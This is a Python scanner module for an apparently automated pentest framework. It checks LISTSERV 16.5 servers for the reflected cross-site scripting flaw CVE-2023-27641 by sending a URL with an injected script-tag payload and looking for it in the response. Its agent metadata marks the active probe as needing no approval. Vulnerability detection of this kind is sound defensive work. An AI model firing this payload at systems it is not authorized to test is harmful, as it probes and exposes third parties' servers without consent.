#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The REPORT (after z but before a) parameter in wa."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'L-Soft LISTSERV 16.5 - Cross-Site Scripting Detection',
        'description': 'The REPORT (after z but before a) parameter in wa.exe in L-Soft LISTSERV 16.5 before 17 allows an attacker to conduct XSS attacks via a crafted URL.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'listserv', 'edb', 'lsoft', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/hosakauk/exploits/blob/master/listserv_report_xss.MD',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-27641',
        ],
        'cve': 'CVE-2023-27641',
    }

    def run(self):
        path = '/wa.exe?REPORT&z=4&"><script>alert(document.domain)</script>a=1'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        content_type = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        body_all = ('><script>alert(document.domain)</script>', 'listserv',)
        ctype_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='medium',
                reason='L-Soft LISTSERV 16.5 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

